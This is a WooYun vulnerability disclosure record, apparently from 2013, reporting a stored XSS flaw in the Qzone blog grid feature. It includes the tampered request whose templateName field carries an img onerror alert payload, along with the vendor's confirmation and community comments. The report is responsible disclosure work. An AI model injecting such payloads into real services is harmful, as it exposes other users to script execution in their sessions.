{"id": 13042, "wybug_id": "wooyun-2013-020390", "wybug_title": "QQ空间某功能缺陷导致日志存储型XSS - 6", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2013-03-20 22:35", "wybug_open_date": "2013-05-04 22:35", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "类型应用", "存储型", "黑盒"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-04：\t细节向公众公开  简要描述： 在这个系列的第一个漏洞时，由于2个缺陷点距离不远，当时就已经发现了这个问题，想着腾讯可能对第一个漏洞采用某些方式修复；如果是用 json.parse的方式修复，那么这第2个问题应该会依然存在，如我所料，于是。。。 详细说明：  1. 接着看这个系列的第一个漏洞（content_gridsblog.js）中那部分的代码。腾讯为了修复这个漏洞，采用了更为安全的JSON.parse函数作为修复方案。这种修复是没有问题的。\n\n其它有类似缺陷的网站可以参考腾讯的修复方案。2. 但实际上，在这段代码下方的不远处，还存在着另外一处缺陷，如下图所示：\n\n可以看到， oGridInfo为 JSON.parse解析出来的一个[Object]而 oGridInfo.templateName 取出来后，没有经过任何过滤，就传入到了 innerHTML 中。而从抓包的数据来看，json数据里的templateName 我们是可控的，那么这里就显然存在问题啦～3. 修改日志数据包中的templateName，并发送。\n{\"g0\":{\"visible\":1,\"id\":0,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"?????????\"},\"g5\":{\"visible\":1,\"id\":5,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"2012?????????\"},\"g1\":{\"visible\":1,\"id\":1,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"???????\"},\"templateName\":\"<img src=1 onerror='alert(1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111)'>\",\"g4\":{\"visible\":1,\"id\":4,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"2013-03-20&1\",\"text\":\"\"},\"type\":0,\"title\":\"???? 2013-3-20\"},\"g7\":{\"visible\":1,\"id\":7,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"??????????\"},\"version\":\"1.2\",\"g2\":{\"visible\":1,\"id\":2,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"??????\"},\"bgItem\":{\"bgId\":\"130\",\"bgURL\":\"/qzone/newblog/v5/flashassets/bg130.swf?bgver=1.0&max_age=31104000\",\"gridcolor\":\"0xF06368\",\"alpha\":1,\"align\":\"right\",\"wordcolor\":\"0xFFFFFF\"},\"tempId\":56,\"g8\":{\"visible\":1,\"id\":8,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"???????????\"},\"g6\":{\"visible\":1,\"id\":6,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"????????????\"},\"g3\":{\"visible\":1,\"id\":3,\"content\":{\"mood\":\"\",\"image\":\"\",\"date\":\"\",\"text\":\"1\"},\"type\":1,\"title\":\"2012?????????\"}}\n4. 用另外一个号，查看已经发表的日志。 成功弹出啦。\n\n   漏洞证明：  见详细说明，由于代码逻辑上，只有他人查看日志时，才会触发此段代码，故测试时，请以第三者身份查看包含缺陷代码的日志   修复方案：  oGridInfo.templateName取出后，HTMLencode一下。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-21 12:43 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-20 22:40 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  2哥尿湿入神    \n     2013-03-20 22:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  腾讯这情况是要拉动gdp么    \n     2013-03-20 22:44 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser 漏洞求审核~    \n     2013-03-20 22:49 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @xsser ？腾讯在何方？    \n     2013-03-20 22:49 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  求妹纸.....    \n     2013-03-20 22:50 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  连载! tx高潮了。。。    \n     2013-03-20 22:53 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:41        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  ....    \n     2013-03-20 23:17 |    \t\tlsh4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:13        | 不是黑客!但是黑客手段都要会?)\t\t \n  2哥开挂刷分了    \n     2013-03-20 23:26 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  求二哥和我搞基    \n     2013-03-21 00:22 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  默默地再关注一次    \n     2013-03-21 08:32 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  鄙视开挂的    \n     2013-03-21 08:43 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  又要一篇好的学习文章！二哥出品，必属精品！    \n     2013-03-21 09:00 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  二哥开挂了，又是个连载啊 ~~    \n     2013-03-21 09:37 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:202        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  我是来围观的。。    \n     2013-03-21 09:41 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n  就打个包一起发了，多次高潮围观的人受不了！    \n     2013-03-21 10:13 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  二哥你这是要跟我抢粉丝？    \n     2013-03-21 10:16 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @心伤的瘦子 瘦子好久没更新了额。    \n     2013-03-21 10:39 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @心伤的瘦子 再来个连续剧就能把他甩在后面更远    \n     2013-04-10 12:46 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  @心伤的瘦子 期待瘦子的大作！    \n     2013-04-20 22:51 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  @心伤的瘦子 期待瘦子的大作！    \n     2013-04-22 13:14 |    \t\tDemon \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:14        | You are my dream)\t\t \n  我想知道最后修改content数据是用什么提交的？求软件名字    \n     2013-04-22 13:25 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @Demon charles web proxy    \n     2013-04-22 16:28 |    \t\tDemon \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:14        | You are my dream)\t\t \n  @gainover 谢谢二哥啊~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}